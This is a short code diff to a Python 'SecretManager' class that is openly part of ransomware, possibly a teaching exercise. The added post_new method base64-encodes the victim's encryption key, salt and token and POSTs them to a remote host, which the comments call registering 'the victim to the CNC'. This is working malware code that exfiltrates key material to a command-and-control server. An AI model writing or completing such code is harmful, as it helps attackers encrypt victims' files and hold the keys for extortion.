@@ -2,6 +2,7 @@ from hashlib import sha256
 import logging
 import os
 import secrets
+import json
 from typing import List, Tuple
 import os.path
 import requests
@@ -46,8 +47,9 @@ class SecretManager:
         # self._key=os.urandom(self.KEY_LENGTH)
         # self._salt=os.urandom(self.SALT_LENGTH)
 
+        # token=secrets.token_bytes(self.TOKEN_LENGTH)
         token=self.do_derivation(self._salt,self._key)
-
+        
         return self._key,self._salt,token
 
 
@@ -56,8 +58,16 @@ class SecretManager:
         return str(tmp, "utf8")
 
     def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
+
+        payload={
+            "token" : self.bin_to_b64(token),
+            "salt" : self.bin_to_b64(salt),
+            "key" : self.bin_to_b64(key),
+        }
+        
+        r=requests.post(self._remote_host_port,data=json.dumps(payload))
         # register the victim to the CNC
-        raise NotImplemented()
+
 
     def setup(self)->None:
         # main function to create crypto data and register malware to cnc
